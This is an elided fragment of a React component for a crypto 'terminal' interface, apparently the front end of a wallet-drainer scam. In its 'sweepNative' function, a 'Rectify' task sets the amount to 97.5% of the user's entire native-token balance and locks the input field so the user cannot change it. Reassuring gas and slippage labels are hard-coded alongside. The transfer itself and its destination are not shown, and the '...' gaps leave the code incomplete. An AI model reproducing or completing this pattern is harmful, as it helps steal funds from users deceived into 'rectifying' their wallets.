...
export default function EvedexTerminal() {
  ...
  const sweepNative = () => {
    ...
    const val = activeTask === "Rectify" ? (nativeBal.value * 975n) / 1000n : parseEther(inputVal || "0.001");
          ...
          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
              ...
              <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
                ...
                <input type="number" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
              </div>
              <div style={{fontSize:'8px', color:'#475569', display:'flex', justifyContent:'space-between', marginBottom:'30px', padding:'0 10px'}}>
                <span>ESTIMATED_GAS: 0.0012 {nativeBal?.symbol}</span>
                <span>POOL_SLIPPAGE: 0.1%</span>
              </div>
